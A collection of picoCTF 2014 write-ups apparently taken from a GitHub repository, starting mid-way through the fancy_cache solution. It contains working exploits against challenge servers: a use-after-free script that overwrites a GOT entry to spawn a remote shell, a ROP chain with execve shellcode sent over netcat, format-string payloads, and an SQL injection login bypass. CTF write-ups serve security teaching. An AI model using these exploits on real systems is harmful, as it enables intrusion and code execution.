'\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc9\\x8b\\x04\\x08')\n# This is read into the old \"key\" struct (used to be 0x7, 0x0, *(keyAAAA))\n# We supply the address of 'printf', so the check will pass & we read whatever is at value->data\nprint cache_get(f, '\\x06\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x10\\x83\\x04\\x08')\n# Print the actual data!\nprint cache_get(f, 'printf')\n```\n\nThis gives the following output locally:\n\n```bash\nbas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py \nAAAA____\nNone\nNone\nREDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED RED\n```\n\nAnd for the remote server:\n\n```bash\nbas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py \n\nAAAA____\nNone\nNone\nongratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shel\n```\n\nAha! Hints! Actually, that page spells out exactly what we need to do. I decided to follow it, also because of the very specific mention of the address of `memcmp`, which we need to defeat ASLR. Using the same read memory trick, we grab the address of `memcmp`, which is stored at `0x804b014`. Using this address, we can calculate system by subtracting 0x142870 and adding 0x40100, the address of system in the supplied libc.so.6. Then, we need to write that value to `0x804b014` by doing a cache_set call. Finally, we need to trigger `memcmp`, which now actually calls `system`. Oof! This turned out to be less-than-trivial, mostly because of differences in the address of memcmp on my local box. Finally, I worked out the following script (hopefully with enough comments to make sense of what's going on):\n\n```python\n#!/usr/bin/python\nimport struct\nimport socket\nimport telnetlib\n\ndef pack4(v):\n    \"\"\"\n    Takes a 32 bit integer and returns a 4 byte string representing the\n    number in little endian.\n    \"\"\"\n    assert 0 <= v <= 0xffffffff\n    # The < is for little endian, the I is for a 4 byte unsigned int.\n    # See https://docs.python.org/2/library/struct.html for more info.\n    return struct.pack('<I', v)\n\ndef unpack4(v):\n    \"\"\"Does the opposite of pack4.\"\"\"\n    assert len(v) == 4\n    return struct.unpack('<I', v)[0]\n\nCACHE_GET = 0\nCACHE_SET = 1\n\nkNotFound = 0x0\nkFound = 0x1\nkCacheFull = 0x2\n\ndef write_string(f, s):\n    f.write(pack4(len(s)))\n    f.write(s)\n\ndef read_string(f):\n    size = unpack4(f.read(4))\n    return f.read(size)\n\ndef cache_get(f, key):\n    f.write(chr(CACHE_GET))\n    write_string(f, key)\n\n    status = ord(f.read(1))\n    if status == kNotFound:\n        return None\n    assert status == kFound\n\n    return read_string(f)\n\n# We need this modified function, because once we hit system('/bin/sh'),\n# there will be no more data sent back in the way that the original \n# function expects. This causes it to b0rk.\ndef cache_get2(f, key):\n    f.write(chr(CACHE_GET))\n    write_string(f, key)\n   \ndef cache_set(f, key, value, lifetime):\n    f.write(chr(CACHE_SET))\n    write_string(f, key)\n\n    status = ord(f.read(1))\n    if status == kCacheFull:\n        return False\n    assert status == kFound\n\n    write_string(f, value)\n    f.write(pack4(lifetime))\n    return True\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('vuln2014.picoctf.com', 4548))\nf = s.makefile('rw', bufsize=0)\n\n# Command to be executed later, once we've overwritten memcmp@plt.\ncmd = '/bin/sh\\x00'\n\n# Add an entry to the cache; we will use this command later to spawn the shell. \ncache_set(f, cmd, \"payload\", 1000)\n\n# Add an entry with a negative lifetime. This will fool cache_lookup, because it only checks for zero:\n'''\n    // Skip expired cache entries.\n    if (entry->lifetime == 0) {\n      continue;\n    }\n'''\ncache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)\n\n# Request that value, causing it to be deleted from cache\nprint cache_get(f, 'keyAAAA')\n\n'''\n// This is how the string struct looks like:\nstruct string {\n  size_t length;\n  size_t capacity;\n  char *data;\n};\n'''\n# Now, we request the value of a key called '\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\...\"\n# but this is read into the old \"value\" struct (used to be 0x8, 0x0, *(AAAA____)),\n# because malloc will re-use this address.\n# Leak memcmp address @ 0x804b014\ncache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))\n\n# This is read into the old \"key\" struct (used to be 0x7, 0x0, *(keyAAAA))\n# We supply the address of 'printf', so the check will pass & we read whatever is at value->data\ncache_get(f, pack4(6)+pack4(6)+pack4(0x8048310))\n\n# Grab memcmp address:\naddr_memcmp = unpack4(cache_get(f, 'printf'))\nprint \"[+] Leaking memcmp address: {}\".format(hex(addr_memcmp))\n\n# Calculate system address:\naddr_system = addr_memcmp - 0x142870 + 0x40100 \nprint \"[+] Calculated system address: {}\".format(hex(addr_system))\n\n# Now we have to overwrite memcmp @ 0x804b014. The hints say we can do this with cache_set. \n# We'd love to abuse our old cache entry again, but alas, the memory regions have again been \n# freed(), due to cache_get seeing a lifetime <= 0.\n# We'll restore them, so we can abuse them again to write to 0x804b014.\n\ncache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))\ncache_get(f, pack4(6)+pack4(0)+pack4(0x8048310))\n\nprint \"[+] Attempting to overwrite memcmp pointer...\"\nassert cache_set(f, 'printf', pack4(addr_system), 1)\n\nprint \"[+] Running {} on remote box\".format(cmd)\nprint cache_get2(f, cmd)\n\n# Once you get the service to run a shell, this lets you send commands\n# to the shell and get the results back :-)\n\nt = telnetlib.Telnet()\nt.sock = s\nt.interact()\n```\n\nRunning it lands us a shell!\n\n```bash\nbas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py \nAAAA____\n[+] Leaking memcmp address: 0xf7686870\n[+] Calculated system address: 0xf7584100\n[+] Attempting to overwrite memcmp pointer...\n[+] Running /bin/sh on remote box\nNone\nid\nuid=1009(fancy_cache) gid=1009(fancy_cache) groups=1009(fancy_cache)\nls /home/ \nbleichenbacher\neasyoverflow\necb\nfancy_cache\nguess\nhardcore_owner\nlowentropy\nnetsino\npolicerecords\nubuntu\nls /home/fancy_cache\nfancy_cache\nfancy_cache.sh\nflag.txt\ncat /home/fancy_cache/flag.txt\nthat_wasnt_so_free_after_all\n```\n\nThe flag is `that_wasnt_so_free_after_all`. Fancy indeed!\n", "timestamp": "2025-10-24T11:40:15.597087"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/format.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/format.md", "content": "### Solved by et0x\n\nFormat is a 70 point binary exploitation challenge. \n\n> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found here. \n\nThe source of the binary is as follows:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n\nint secret = 0;\n\nvoid give_shell(){\n    gid_t gid = getegid();\n    setresgid(gid, gid, gid);\n    system(\"/bin/sh -i\");\n}\n\nint main(int argc, char **argv){\n    int *ptr = &secret;\n    printf(argv[1]);\n\n    if (secret == 1337){\n        give_shell();\n    }\n    return 0;\n}\n```\nSo we need to somehow find a way to change the value of secret to 1337, using a format string attack because the printf() function isn't correctly implemented.  Well first thing's first, lets find out what the stack looks like.\n\n*note: the environment variables mess with the stack in this problem, so do yourself a favor by prepending the command with 'env -i' to clear the environment before running the command.*\n```bash\npico1139@shell:/home/format$ for i in {1..256};do echo -n \"Offset: $i:\"; env -i ./format AAAA%$i\\$x;echo ;done | grep 4141\nOffset: 105:AAAA41414141\n```\n\nThis means we can see our input at offset 105 from the top of the stack.  However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then.  (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)\n\n```bash\nfor i in {1..256};do echo -n \"Offset: $i:\"; env -i ./format AAAA%$i\\$x%1333u;echo ;done | grep 4141\nOffset: 103:AAAA41410074\nOffset: 104:AAAA31254141\n```\n\nSo we found our A's again, but they aren't aligned on the stack.  Lets add two more A's at the end to see if we can get it to line up.\n\n```bash\nfor i in {1..256};do echo -n \"Offset: $i:\"; env -i ./format AAAA%$i\\$x%1333uAA;echo ;done | grep 41414141\nOffset: 103:AAAA41414141\n```\n\nGreat! Our offset is 103.  Now we need to find out what address to use to change the data in \"secret\"\n\n```\npico1139@shell:/home/format$ gdb -q format\nReading symbols from format...(no debugging symbols found)...done.\n(gdb) disass main\nDump of assembler code for function main:\n   0x080484e2 <+0>:\tpush   %ebp\n   0x080484e3 <+1>:\tmov    %esp,%ebp\n   0x080484e5 <+3>:\tand    $0xfffffff0,%esp\n   0x080484e8 <+6>:\tsub    $0x20,%esp\n   0x080484eb <+9>:\tmovl   $0x804a030,0x1c(%esp)\n   0x080484f3 <+17>:\tmov    0xc(%ebp),%eax\n   0x080484f6 <+20>:\tadd    $0x4,%eax\n   0x080484f9 <+23>:\tmov    (%eax),%eax\n   0x080484fb <+25>:\tmov    %eax,(%esp)\n   0x080484fe <+28>:\tcall   0x8048350 <printf@plt>\n   0x08048503 <+33>:\tmov    0x804a030,%eax\n   0x08048508 <+38>:\tcmp    $0x539,%eax\n   0x0804850d <+43>:\tjne    0x8048514 <main+50>\n   0x0804850f <+45>:\tcall   0x80484ad <give_shell>\n   0x08048514 <+50>:\tmov    $0x0,%eax\n   0x08048519 <+55>:\tleave  \n   0x0804851a <+56>:\treturn\n```\n\nIt looks like the address **0x0804a030** is getting placed in *ptr.  That's the address we need to use in place of our A's.  In order to place the number 1337 into secret's memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)\n\n\n```bash\npico1139@shell:/home/format$ env -i ./format $(python -c 'print \"\\x30\\xa0\\x04\\x08\"+\"%1333u%103$nAA\"')\n$ id\nuid=11066(pico1139) gid=1008(format) groups=1017(picogroup)\n$ ls\nMakefile  flag.txt  format  format.c\n$ cat flag.txt\nwho_thought_%n_was_a_good_idea?\n```\n", "timestamp": "2025-10-24T11:40:15.692871"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/function-address.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/function-address.md", "content": "### Solved by superkojiman\n\nFunction Address is a 60 point reverse engineering challenge. \n\n> We found this program file on some systems. But we need the address of the 'find_string' function to do anything useful! Can you find it for us?\n\nThis is basically a free 60 points. We can get the function address using gdb:\n\n```\n# gdb ./problem -q -batch -n -ex 'p find_string'\n$1 = {<text variable, no debug info>} 0x8048444 <find_string>\n```\n\nThe flag is **08048444**\n", "timestamp": "2025-10-24T11:40:15.868632"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/grep-is-still-your-friend.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/grep-is-still-your-friend.md", "content": "### Solved by bitvijays\n\nGrep is your friend is a 40 point forensics challenge. You are required to search a key for a particular file.\n\n> The police need help decrypting one of your father's files. Fortunately you know where he wrote down all his backup decryption keys as a backup (probably not the best security practice). You are looking for the key corresponding to daedaluscorp.txt.enc. The file is stored on the shell server at /problems/grepfriend/keys.\n\nFor this challenge, we need to search for the daedaluscorp.txt.enc inside directories or files. Grep allows you to search inside the files too. \n```\ngrep -rnw -e \"daedaluscorp.txt.enc\" \ngrep -rnw '/problems/grepfriend/keys' -e \"daedaluscorp.txt.enc\"\n-r                    : search recursively\n-n                    : print line number\n-w                    : match the whole word.\n-e                    : pattern to search for\n\n\npico*****@shell:~$ grep -rnw '/problems/grepfriend/keys' -e \"daedaluscorp.txt.enc\"\n5865:daedaluscorp.txt.enc\tb2bee8664b754d0c85c4c0303134bca6\n\n```\n\nThe flag is **b2bee8664b754d0c85c4c0303134bca6**\n\n", "timestamp": "2025-10-24T11:40:15.954664"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/guess.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/guess.md", "content": "### Solved by Swappage\n\nGuess was a basic 75 points binary exploitation challenge in picoCTF 2014\n\n![](/images/2014/pico/guess/problem.png)\n\n<!-- more -->\n\nThe source code was available for download so it was really quick to spot the vuln:\n\n```c\n\t#include <stdio.h>\n\t#include <stdlib.h>\n\n\tchar *flag = \"~~FLAG~~\";\n\n\tvoid main(){\n\t    int secret, guess;\n\t    char name[32];\n\t    long seed;\n\n\t    FILE *f = fopen(\"/dev/urandom\", \"rb\");\n\t    fread(&secret, sizeof(int), 1, f);\n\t    fclose(f);\n\n\t    printf(\"Hello! What is your name?\\n\");\n\t    fgets(name, sizeof(name), stdin);\n\n\t    printf(\"Welcome to the guessing game, \");\n\t    printf(name);\n\t    printf(\"\\nI generated a random 32-bit number.\\nYou have a 1 in 2^32 chance of guessing it. Good luck.\\n\");\n\n\t    printf(\"What is your guess?\\n\");\n\t    scanf(\"%d\", &guess);\n\n\t    if(guess == secret){\n\t\tprintf(\"Wow! You guessed it!\\n\");\n\t\tprintf(\"Your flag is: %s\\n\", flag);\n\t    }else{\n\t\tprintf(\"Hah! I knew you wouldn't get it.\\n\");\n\t    }\n\t}\n```\n\nAt line 19 there is a wonderful printf(name), which obviously results in a format string exploitable bug.\n\nThe program is pretty simple in its functionality, what it does is to open a file from which it reads the flag, then it generates a random number and asks you for your name.\nThen it asks you to guess the number it generated.\n\nObviously abusing the format string bug, we can leak the informations from memory, read the number from the stack and reply with the correct answer, at which point we are returned the flag.\n\nOn my local machine using gdb could spot where the number was stored on the stack very precisely, which was at %14$i.\nThis didn't work on the real target most likely because the binary was compiled under a different system, but with a little of brute forcing, i could eventually work things out\n\n\t$ nc vuln2014.picoctf.com 4546\n\tHello! What is your name?\n\t%4$i\n\tWelcome to the guessing game, -1715610369\n\n\tI generated a random 32-bit number.\n\tYou have a 1 in 2^32 chance of guessing it. Good luck.\n\tWhat is your guess?\n\t-1715610369\n\tWow! You guessed it!\n\tYour flag is: leak_the_seakret\n\n\n", "timestamp": "2025-10-24T11:40:16.039766"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/hardcore-rop.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/hardcore-rop.md", "content": "### Solved by barrebas\n\nPicoctf had a few \"Master Challenges\" worth 200 points. This is how we broke `hardcore_rop`. The challenge promises ASLR, NX, PIE and what-have-you, so let's get cracking!\n\nUpon inspecting the source of code of this weird program, we see the following:\n\n```c\nvoid randop() {\n\tmunmap((void*)0x0F000000, MAPLEN);\n\tvoid *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);\n\tunsigned seed;\n\tif(read(0, &seed, 4) != 4) return;\n\tsrand(seed);\n\tfor(int i = 0; i < MAPLEN - 4; i+=3) {\n\t\t*(int *)&((char*)buf)[i] = rand();\n\t\tif(i%66 == 0) ((char*)buf)[i] = 0xc3;\n\t}\n\tmprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);\n\tputs(\"ROP time!\");\n\tfflush(stdout);\n\tsize_t x, count = 0;\n\tdo x = read(0, ((char*)&seed)+count, 555-count);\n\twhile(x > 0 && (count += x) < 555 && ((char*)&seed)[count-1] != '\\n');\n}\n\nint main(int argc, char *argv[]) {\n\tstruct stat st;\n\tif(argc != 2 || chdir(argv[1]) != 0 || stat(\"./flag\", &st) != 0) {\n\t\tputs(\"oops, problem set up wrong D:\");\n\t\tfflush(stdout);\n\t\treturn 1;\n\t} else {\n\t\tputs(\"yo, what's up?\");\n\t\talarm(30); sleep(1);\n\t\trandop();\n\t\tfflush(stdout);\n\t\treturn 0;\n\t}\n}\n```\n\nThe `randop()` function is interesting, because it does two things. Firstly, this bit builds random ROP gadgets:\n\n```c\n\tmunmap((void*)0x0F000000, MAPLEN);\n\tvoid *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);\n\tunsigned seed;\n\tif(read(0, &seed, 4) != 4) return;\n\tsrand(seed);\n\tfor(int i = 0; i < MAPLEN - 4; i+=3) {\n\t\t*(int *)&((char*)buf)[i] = rand();\n\t\tif(i%66 == 0) ((char*)buf)[i] = 0xc3;  \n\t}\n\tmprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);\n```\n\nThe memory region containing the random ROP gadgets is set to executable. However, we control the seed value, so we can \"choose\" which gadgets are generated. Secondly, this function causes a buffer overflow thanks to the following code:\n\n```c\n\tsize_t x, count = 0;\n\tdo x = read(0, ((char*)&seed)+count, 555-count);\n\twhile(x > 0 && (count += x) < 555 && ((char*)&seed)[count-1] != '\\n');\n```\n\nThis function starts to overwrite the stack up to the point were the saved return address is. Very nice! First, let's enable coredumps and get control of EIP.\n\n```bash\nbas@tritonal:~/tmp/picoctf/hardcorrop$ (echo 7777; python -c 'print \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\"') | ./hardcore_rop `pwd`\nyo, what's up?\nROP time!\nSegmentation fault (core dumped)\nbas@tritonal:~/tmp/picoctf/hardcorrop$ gdb hardcore_rop core\nGNU gdb (GDB) 7.4.1-debian\n...\nCore was generated by `./hardcore_rop /home/bas/tmp/picoctf/hardcorrop'.\nProgram terminated with signal 11, Segmentation fault.\n#0  0x42424242 in ?? ()\n```\n\nExcellent! After we send a seed value (7777), we supply a buffer that overwrites the saved return address on the stack. But we cannot just put our shellcode on the stack and execute it, because of NX. We can't write into the region at `0xf000000` because it isn't writeable. Furthermore, most of the address are randomized due to PIE and ALSR. Only the ROP gadgets at `0xf000000` are always at the same location. We need to find enough ROP gadgets to make the region at `0xf000000` writeable, so that we can store shellcode there and execute it. \n\nFor this to work, we need two things: control over registers and an `int 0x80` instruction, to execute syscalls. The region at `0xf000000` contains 40960 bytes, filled with random ROP gadgets. There could be an `int 0x80; ret;` in there. The chances are slim, but there's a chance nonetheless. I scripted the search for ROP gadgets with the following:\n\n```bash\n#!/bin/bash\n\nwhile read i; do\n\t(echo $i; echo \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\") | ./hardcore_rop `pwd`\n\tdd if=core of=region bs=1 skip=4096 count=40960\n\txxd -c 1 region | awk {'print $1 $2'} |sort -r > dump.txt\n\tpython ./ropgadget.py -i bleh -d 10 > $i-gadgets.txt\n\n\tcat $i-gadgets.txt |egrep 'int 0x80'\n\trm core\n\trm dump.txt\ndone < digits.txt\n```\n\nThis script does the following: it runs the program and sends a seed value for the ROP gadget generation. Then, it crashes the program. From the coredump, it extracts the region at `0xf000000` and proceeds to dump all these bytes into a textfile. Finally, my custom [ropgadget.py](https://gist.github.com/barrebas/4fc86eaf0e9b124813a3) searcher extracts all the ROP gadgets. It is slightly modified to work with this setup. I let this script run for a few hours. After a while, I ran \n\n```bash\nbas@tritonal:~/tmp/picoctf/hardcorrop$ grep \"int 0x80\" *\n0347-gadgets.txt:RET: 0x0000d64: int 0x80; lahf; ret; \n```\n\nIt found an `int 0x80` gadget! Luckily, the opcode `lahf` is harmless: it just load the FLAGS into `ah`. No big deal! With this useable gadget, a ROP chain could be built that calls `mprotect` to set the region at `0xf000000` to writeable. After this stage 1, a second stage would read the shellcode. First things first, let's find gadgets that allow us to control registers. The easiest would be a `pop r32; ret`. Luckily, these sequences are very likely to occur. I found everything I needed in the list of gadgets:\n\n```\n# RET: 0x000913f: pop eax; ret;\n# RET: 0x0003c7e: pop ecx; ret;\n# RET: 0x0002393: pop edx; ret;\n# RET: 0x000964d: pop ebx; ret;\n# RET: 0x0000d64: int 0x80; lahf; ret;\n```\n\nI wrote the following ROP chain:\n\n```python\n#!/usr/bin/python\n\nimport struct\n\nBASE = 0xf000000\n# RET: 0x000913f: pop eax; ret;\npopeax = 0x000913f\n# RET: 0x0003c7e: pop ecx; ret;\npopecx = 0x0003c7e\n# RET: 0x0002393: pop edx; ret;\npopedx = 0x0002393\n# RET: 0x000964d: pop ebx; ret;\npopebx = 0x000964d\n# RET: 0x0000569: pop edi; ret;\npopedi = 0x0000569\n# RET: 0x0000d64: int 0x80; lahf; ret;\nint80h = 0x0000d64\n# RET: 0x0001b11: int3; ret;\nint03h = 0x0001b11\n\ndef p(x):\n\treturn struct.pack(\"<L\", x)\n\t\npayload = \"\"\n\n# seed value\npayload += \"0347\\n\"\n\n# overflow buffer\npayload += \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\n# syscall number 125 in eax (mprotect)\npayload += p(BASE + popeax)\npayload += p(125)\n\n# pointer to memory region in ebx\npayload += p(BASE + popebx)\npayload += p(BASE)\n\n# memory flags PROT_READ | PROT_WRITE | PROT_EXEC\npayload += p(BASE + popedx)\npayload += p(7)\n\n# length in ecx, needs to be multiple of 2\npayload += p(BASE + popecx)\npayload += p(0x1000)\n\n# call syscall int 0x80\npayload += p(BASE + int80h)\n\n# stage2 test\n# edi = 0xf000000\npayload += p(BASE + popedi)\npayload += p(BASE)\n# edx = 0xcccccccc (four times int 0x3)\npayload += p(BASE + popedx)\npayload += p(0xcccccccc)\n# RET: 0x0002770: mov [edi], dh; ret\npayload += p(BASE + 0x0002770)\n# return to 0xf000000, which should contain an int 0x3\npayload += p(BASE + popedx + 1)\npayload += p(BASE)\n\nprint payload\n## Usage: $ python ropsploit.py | ./hardcore_rop `pwd`\n```\n\nAfter running this first POC, the binary indeed crashed with a SIGTRAP error! Inspection of the core dump with `gdb` showed that the first byte of `0xf000000` was a `0xcc`, so this worked! \n\nWriting the shellcode one byte at a time seemed tedious. Furthermore, the ROP chain has a maximum of 555 bytes, so a more flexible way was to use `syscall_read`. This will allow us to read in arbitrary shellcode. All the necessary gadgets were present:\n\n```python\n#!/usr/bin/python\n\nimport time, struct\n\nBASE = 0xf000000\npopeax = 0x000913f\npopecx = 0x0003c7e\npopedx = 0x0002393\npopebx = 0x000964d\npopedi = 0x0000569\nint80h = 0x0000d64\nint03h = 0x0001b11\n\ndef p(x):\n\treturn struct.pack(\"<L\", x)\n\t\npayload = \"\"\n\n# seed value\npayload += \"0347\\n\"\n\n# overflow buffer\npayload += \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\n# eax = syscall_mprotect\npayload += p(BASE + popeax)\npayload += p(125)\n# pointer to memory region in ebx\npayload += p(BASE + popebx)\npayload += p(BASE)\n# memory flags PROT_READ | PROT_WRITE | PROT_EXEC\npayload += p(BASE + popedx)\npayload += p(7)\n# length in ecx, needs to be multiple of 2\npayload += p(BASE + popecx)\npayload += p(0x1000)\n# call syscall int 0x80\npayload += p(BASE + int80h)\n\n# eax = syscall_read\npayload += p(BASE + popeax)\npayload += p(3)\n# ecx = ptr to BASE\npayload += p(BASE + popecx)\npayload += p(BASE)\n# ebx = fd = stdin\npayload += p(BASE + popebx)\npayload += p(0)\n# edx = size of shellcode (set to 100)\npayload += p(BASE + popedx)\npayload += p(100)\n# call syscall int 0x80\npayload += p(BASE + int80h)\n\n# return to 0xf000000\npayload += p(BASE + popedx + 1)\npayload += p(BASE)\n\nprint payload\ntime.sleep(3)\n```\n\nNow, this was used with [a slightly modified shellcode](http://shell-storm.org/shellcode/files/shellcode-547.php). This shellcode uses `execve` to run `/bin/ash`; I changed it to run `/bin//sh`. The shellcode has to be supplied seperately on the command line; I could not get the exploit to work if the shellcode was printed from `ropsploit.py`. The following landed us a shell on the remote server (again, using `cat` to keep the shell alive):\n\n```bash\nbas@tritonal:~/tmp/picoctf/hardcorrop$ (python ropsploit.py; python -c 'print \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x8d\\x54\\x24\\x08\\x50\\x53\\x8d\\x0c\\x24\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"'; cat) | nc vuln2014.picoctf.com 4000\nyo, what's up?\nROP time!\nls -al\ntotal 24\ndrwxr-xr-x    2 root     root          4096 Oct 28 17:55 .\ndrwxr-xr-x    3 root     root          4096 Oct  5 17:33 ..\n-rw-r--r--    1 root     root            21 Oct  5 17:44 flag\n-rwxr-xr-x    1 root     root         11266 Oct  6 01:13 hardcore_rop\ncat flag\nhard_as_PIE_amirite?\n```\n\nAnd there's the flag! A very fun challenge!\n", "timestamp": "2025-10-24T11:40:16.178272"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/injection1.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/injection1.md", "content": "### Solved by et0x\n\nInjection 1 is a 90 point web exploitation challenge. \n\n> Daedalus Corp. has been working on their login service, using a brand new SQL database to store all of the access credentials. Can you figure out how to login? \n\nUpon visiting the provided link, you are greeted with a simple login form and the source code for the php handler for logins.\n\n```php\n<?php\ninclude \"config.php\";\n$con = mysqli_connect(\"localhost\", \"sql1\", \"sql1\", \"sql1\");\n$username = $_POST[\"username\"];\n$password = $_POST[\"password\"];\n$debug = $_POST[\"debug\"];\n$query = \"SELECT * FROM users WHERE username='$username' AND password='$password'\";\n$result = mysqli_query($con, $query);\n\nif (intval($debug)) {\n  echo \"<pre>\";\n  echo \"username: \", htmlspecialchars($username), \"\\n\";\n  echo \"password: \", htmlspecialchars($password), \"\\n\";\n  echo \"SQL query: \", htmlspecialchars($query), \"\\n\";\n  if (mysqli_errno($con) !== 0) {\n    echo \"SQL error: \", htmlspecialchars(mysqli_error($con)), \"\\n\";\n  }\n  echo \"</pre>\";\n}\n\nif (mysqli_num_rows($result) !== 1) {\n  echo \"<h1>Login failed.</h1>\";\n} else {\n  echo \"<h1>Logged in!</h1>\";\n  echo \"<p>Your flag is: $FLAG</p>\";\n}\n\n?> \n```\nAs you can see, there is no input validation for the username and password fields, all that the script checks for is that there is only one result in the SQL query.  Lets replicate the queries on a local SQL database so we can see what is happening.\n\nThe structure for the table is very basic:\n\n```\nmysql> select * from users_tbl;\n+---------+----------+-----------+\n| user_id | username | password  |\n+---------+----------+-----------+\n|       1 | admin    | adminpass |\n|       2 | user     | userpass  |\n+---------+----------+-----------+\n2 rows in set (0.00 sec)\n```\n\nNow to try to get a positive result from our query.\n\n```\nmysql> SELECT * FROM users_tbl WHERE username='admin' AND password='asdf' or 1=1;#;\n+---------+----------+-----------+\n| user_id | username | password  |\n+---------+----------+-----------+\n|       1 | admin    | adminpass |\n|       2 | user     | userpass  |\n+---------+----------+-----------+\n2 rows in set (0.00 sec)\n```\n\nOkay, now we have results, but as we discussed before, the script makes sure that only one result was found, so we should be able to add a limit 1 statement to limit our results.\n\n```\nmysql> SELECT * FROM users_tbl WHERE username='admin' AND password='asdf' or 1=1 limit 1;#;\n+---------+----------+-----------+\n| user_id | username | password  |\n+---------+----------+-----------+\n|       1 | admin    | adminpass |\n+---------+----------+-----------+\n1 row in set (0.00 sec)\n```\n\nGreat!  Now all we have to do is enter the following in the login form:\n\n>Username: admin\n\n>Password: ' or 1=1 limit 1;#\n\nSure enough, the login works.  The flag is **flag_vFtTcLf7w2st5FM74b**\n", "timestamp": "2025-10-24T11:40:16.251803"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/internet-inspection.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/internet-inspection.md", "content": "### Solved by superkojiman\n\nInternet Inspection is a 30 point web exploitation challenge. \n\n> On his computer, your father left open a browser with the Thyrin Lab Website. Can you find the hidden access code?\n\nThe webiste mentioned looks like this:\n\n![](/images/2014/pico/internet_inspection/01.png)\n\nThe information we need is blurred out, so let's fix that. Using Chrome's Developer Tools, we see that in body > style, there's a table element that blurs out the text:\n\n![](/images/2014/pico/internet_inspection/02.png)\n\nLet's remove the blur and we're left with the following:\n\n![](/images/2014/pico/internet_inspection/03.png)\n\nMuch better, but still unreadable. Notice that right after the style section we just modified, there's a div with id value \"checkers\". It looks like it's responsible for adding the checkere'd effect. \n\n![](/images/2014/pico/internet_inspection/04.png)\n\nDelete that and we're left with the uncensored message along with our flag:\n\n![](/images/2014/pico/internet_inspection/05.png)\n\nThe flag is **flag_dafe3b8b4cb69e88e4271e616ad38a7b5080dd13** \n", "timestamp": "2025-10-24T11:40:16.357493"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/javascrypt.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/javascrypt.md", "content": "### Solved by et0x\n\nJavascrypt is a 40 point reverse engineering challenge. \n\n\n> Tyrin Robotics Lab uses a special web site to encode their secret messages. Can you determine the value of the secret key? \n\nUpon visiting the link provided, you are presented with a form that encodes messages.\n\n![](/images/2014/pico/javascrypt/01.png)\n\nLooking at the source of the page, you see the following Javascript code:\n\n\n```javascript\nvar key; // Global variable. \n            \n// Since the key is generated when the page \n// is loaded, no one will be able to steal it\n// by looking at the source! This must be secure!\nfunction generateKey() {\n  var i = 1;\n  var x = 211;\n  var n = 5493;\n  while (i <= 25) {\n    x = (x * i) % n;\n    i++;\n   }\n  key = \"flag_\" + Math.abs(x);\n}\n            \n  generateKey();\n            \n  // Encode the message using the 'key'\nfunction encode() {                                                        \n  var input = $(\"#inputmessage\").val();\n  var output = CryptoJS.AES.encrypt(input, key);\n  $(\"#outputmessage\").val(output);\n}        \n```\n\nNow, since the solution to this problem is the key, all you have to do is find the outut to the generateKey() function.  There are plenty of ways to do this, but I just take the code and adapt it to python.\n\n```python\n#!/usr/bin/python\n\ni = 1\nx = 211\nn = 5493\nwhile (i<=25):\n\tx = (x*i)%n\n\ti += 1\n\nprint \"flag_%s\"%abs(x)\n```\n\nWhich results in **flag_2781**\n", "timestamp": "2025-10-24T11:40:16.454867"}
